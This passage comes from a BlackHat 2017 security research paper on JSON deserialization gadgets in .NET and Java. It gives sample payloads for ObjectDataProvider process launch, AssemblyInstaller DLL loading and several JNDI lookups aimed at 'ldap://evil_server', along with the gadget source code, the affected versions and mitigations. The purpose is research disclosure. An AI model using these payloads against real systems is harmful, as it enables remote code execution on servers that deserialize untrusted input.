payload.  
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Requirements: 
• 
JSON unmarshaller  should be able to unmarshal System.Uri type. 
• 
JSON unmarshaller  should call setters for Types that implement IDictionary. Often in this case 
unmarshallers just put key-value pairs in the dictionary instead of using the setter to assign its value. 
System.Windows.Data.ObjectDataProvider 
Sample JSON payload: 
{"$type":"System.Windows.Data.ObjectDataProvider, 
PresentationFramework, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParamet
ers":{"$type":"System.Collections.ArrayList, 
mscorlib","$values":["calc"]},"ObjectInstance":{"$type":"System.Diag
nostics.Process, System, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b77a5c561934e089"}} 
Source code: 
// System.Windows.Data.ObjectDataProvider 
public void set_ObjectInstance(object value) 
{ 
... 
if (this.SetObjectInstance(value) && !base.IsRefreshDeferred) 
{ 
base.Refresh(); 
} 
} 
// System.Windows.Data.ObjectDataProvider 
public void set_MethodName(string value) 
{ 
this._methodName = value; 
this.OnPropertyChanged("MethodName"); 
if (!base.IsRefreshDeferred) 
{ 
base.Refresh(); 
} 
}... 
// System.Windows.Data.DataSourceProvider 
public void Refresh() 
{ 
this._initialLoadCalled = true; 
this.BeginQuery(); 
} 
// System.Windows.Data.ObjectDataProvider 
protected override void BeginQuery() 
{ 
... 
if (this.IsAsynchronous) 
{ 
ThreadPool.QueueUserWorkItem(new 
WaitCallback(this.QueryWorker), null); 
return; 
} 
this.QueryWorker(null); 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
} 
// System.Windows.Data.ObjectDataProvider 
private void QueryWorker(object obj) 
{ 
... 
Exception ex2 = null; 
if (this._needNewInstance && this._mode == 
ObjectDataProvider.SourceMode.FromType) 
{ 
ConstructorInfo[] constructors = 
this._objectType.GetConstructors(); 
if (constructors.Length != 0) 
{ 
this._objectInstance = this.CreateObjectInstance(out 
ex2); 
} 
this._needNewInstance = false; 
} 
if (string.IsNullOrEmpty(this.MethodName)) 
{ 
obj2 = this._objectInstance; 
} 
else 
{ 
obj2 = this.InvokeMethodOnInstance(out ex); 
... 
// System.Windows.Data.ObjectDataProvider 
private object InvokeMethodOnInstance(out Exception e) 
{ 
... 
object[] array = new object[this._methodParameters.Count]; 
this._methodParameters.CopyTo(array, 0); 
try 
{ 
result = 
this._objectType.InvokeMember(this.MethodName, BindingFlags.Instance 
| BindingFlags.Static | BindingFlags.Public | 
BindingFlags.FlattenHierarchy | BindingFlags.InvokeMethod | 
BindingFlags.OptionalParamBinding, null, this._objectInstance, 
array, CultureInfo.InvariantCulture); 
} 
Attack vector:  
This gadget is very flexible and offers various attack scenarios therefore we were able to use it for almost any 
unmarshaller: 
• 
We can call any method of unmarshaled object (ObjectInstance + MethodName) 
• 
We can call parametrized constructor of desired type with controlled parameters (ObjectType + 
ConstructorParameters) 
• 
We can call any public method including static ones with controlled parameters  (ObjectInstance + 
MethodParameters + MethodName or  ObjectType + ConstructorParameters + MethodParameters + 
MethodName)   
System.Windows.Forms.BindingSource 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Sample JSON payload: 
{"$type":"System.Windows.Forms.BindingSource, System.Windows.Forms, 
Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", 
"DataMember":"HelpText", 
"dataSource":{"$type":"System.Configuration.Install.AssemblyInstalle
r, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b03f5f7f11d50a3a","Path":" 
file:///c:/somePath/MixedLibrary.dll"}}  
Source code: 
// System.Windows.Forms.BindingSource 
public void set_DataSource(object value) 
{ 
... 
this.dataSource = value; 
... 
this.ResetList(); 
... 
// System.Windows.Forms.BindingSource 
private void ResetList() 
{ 
... 
object obj = (this.dataSource is Type) ? 
BindingSource.GetListFromType(this.dataSource as Type) : 
this.dataSource; 
object list = ListBindingHelper.GetList(obj, 
this.dataMember); 
... 
// System.Windows.Forms.ListBindingHelper 
public static object GetList(object dataSource, string dataMember) 
{ 
... 
PropertyDescriptorCollection listItemProperties = 
ListBindingHelper.GetListItemProperties(dataSource); 
PropertyDescriptor propertyDescriptor = 
listItemProperties.Find(dataMember, true); 
... 
} 
else 
{ 
obj = dataSource; 
} 
if (obj != null) 
{ 
return propertyDescriptor.GetValue(obj); 
} 
... 
Attack vector:  
Arbitrary getter call 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider 
Some gadgets can be used as a “bridge” to other formatters. Despite that this library is a quite rare (it is part of MS 
Exchange Server) we decided to provide its details as it can be a good example of such type of gadgets:     
//Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSetti
ngsProvider 
public void set_ByteData(byte[] value) 
{ 
   if (value != null) 
   { 
      MemoryStream memoryStream = new MemoryStream(value); 
      try 
      { 
         try 
         { 
            BinaryFormatter binaryFormatter = new BinaryFormatter(); 
            Hashtable hashtable = 
(Hashtable)binaryFormatter.Deserialize(memoryStream); 
... 
Attack vector:  
It allows jumping from setters to nested BinaryFormatter deserialization. 
System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument 
These are examples of XXE gadgets. There are plenty of them but since XmlTextReader hardening in 4.5.2, it is not 
possible to use them since the XML parser will not load XML entities in the default configuration. Therefore these 
gadgets are no longer relevant, especially in the presence of existing RCE gadgets. 
Java RCE gadgets 
org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName 
This gadget was presented during our JNDI attacks talk at BlackHat 2016 10 
Sample JSON payload: 
{"@class":"org.hibernate.jmx.StatisticsService","sessionFactoryJNDIN
ame":"ldap://evil_server/uid=somename,ou=someou,dc=somedc"} 
Source code: 
public void setSessionFactoryJNDIName(String sfJNDIName) { 
    this.sfJNDIName = sfJNDIName; 
10 https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-
RCE.pdf 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
    try { 
        Object obj = new InitialContext().lookup(sfJNDIName); 
        if (obj instanceof Reference) { 
            Reference ref = (Reference) obj; 
            setSessionFactory( (SessionFactory) 
SessionFactoryObjectFactory.getInstance( (String) 
ref.get(0).getContent() ) ); 
        } 
        else { 
            setSessionFactory( (SessionFactory) obj ); 
        }  
    }  
    … 
} 
Attack vector:  
JNDI lookup (see "Notes about JNDI attack vectors") 
Availability: 
Available in the following Maven Central packages/versions: 
• 
org.hibernate / hibernate  
o 
3.1 – 3.2.7 
• 
 org.hibernate / hibernate-jmx 
o 
3.3.0 – 3.5.6  
• 
org.hibernate / hibernate-core 
o 
3.6.0 – 4.2.20 
• 
 com.springsource / org.hibernate 
o 
3.2.6 – 4.1.0 
• 
com.springsource / org.hibernate.core 
4.0.0 – 4.1.0 
com.sun.rowset.JdbcRowSetImpl.setAutoCommit 
This is the most interesting example since it is present in the Java Runtime and therefore, requires no external 
dependencies. It is not really a setter since there is no field called autoCommit, but libraries such as Jackson and 
Genson will invoke it when deserializing an "autoCommit" attribute in the JSON data. 
Sample JSON Payload: 
{"@class":"com.sun.rowset.JdbcRowSetImpl", 
"dataSourceName":"ldap://evil_server/uid=somename,ou=someou,dc=somed
c", "autoCommit":true} 
Source code: 
public void setAutoCommit(boolean autoCommit) throws SQLException { 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
     if(conn != null) { 
        conn.setAutoCommit(autoCommit); 
     } else { 
        conn = connect(); 
        conn.setAutoCommit(autoCommit); 
     } 
} 
protected Connection connect() throws SQLException { 
     if(conn != null) { 
         return conn; 
     } else if (getDataSourceName() != null) { 
        try { 
             Context ctx = new InitialContext(); 
             DataSource ds = (DataSource)ctx.lookup 
(getDataSourceName()); 
        } 
        catch (javax.naming.NamingException ex) { 
            … 
        } 
        … 
     } 
     … 
} 
Attack vector:  
JNDI lookup (see "Notes about JNDI attack vectors") 
Availability: 
Java 9 Jigsaw will potentially kill this gadget since this class won't be exposed by default by the module system. 
However, that will depend on how developers use and adopt Jigsaw. 
org.antlr.stringtemplate.StringTemplate.toString 
Sample JSON payload: 
{"javaClass":"org.antlr.stringtemplate.StringTemplate","attributes":
{"table":{"javaClass":"TARGET_CLASS","TARGET_PROPERTY": 
"value"}},"template":"$table.TARGET_PROPERTY$"} 
Attack vector:  
Arbitrary getter call which can be used to chain to other gadgets such as the infamous 
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()  
Availability: 
Available in antlr.StringTemplate ver 2.x and 3.x 
com.atomikos.icatch.jta.RemoteClientUserTransaction.toString 
Sample JSON Payload: 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
{"@class":" com.atomikos.icatch.jta.RemoteClientUserTransaction", 
"name_":"ldap://evil_server/uid=somename,ou=someou,dc=somedc", 
"providerUrl_":"ldap://evil_server"} 
Source code: 
public String toString () { 
     String ret = null; 
     boolean local = checkSetup (); 
    … 
} 
private boolean checkSetup (){ 
    txmgr_ = TransactionManagerImp.getTransactionManager (); 
    if ( txmgr_ == null ) { 
        try { 
            Hashtable env = new Hashtable (); 
            env.put ( 
Context.INITIAL_CONTEXT_FACTORY,initialContextFactory_ ); 
            env.put ( Context.PROVIDER_URL, providerUrl_ ); 
            Context ctx = new InitialContext ( env ); 
            txmgrServer_ = (UserTransactionServer) 
PortableRemoteObject.narrow ( ctx.lookup ( name_ ), 
UserTransactionServer.class ); 
        } catch ( Exception e ) { 
            e.printStackTrace (); 
            throw new RuntimeException ( getNotFoundMessage () ); 
        } 
        if ( txmgrServer_ == null ) 
            throw new RuntimeException ( getNotFoundMessage () ); 
    } 
    return txmgr_ != null; 
} 
Attack vector:  
JNDI lookup (see "Notes about JNDI attack vectors") 
Availability: 
Available in the following Maven Central packages/versions: 
• 
com.atomikos / transactions-jta 
o 
3.x – latest 
Notes about JNDI attack vectors 
After reporting our previous research about JNDI Injection 11 to Oracle, a new property was added to the JDK on update 
121 12 which disables remote class loading via JNDI object factories stored in naming and directory services by 
11 https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-
wp.pdf 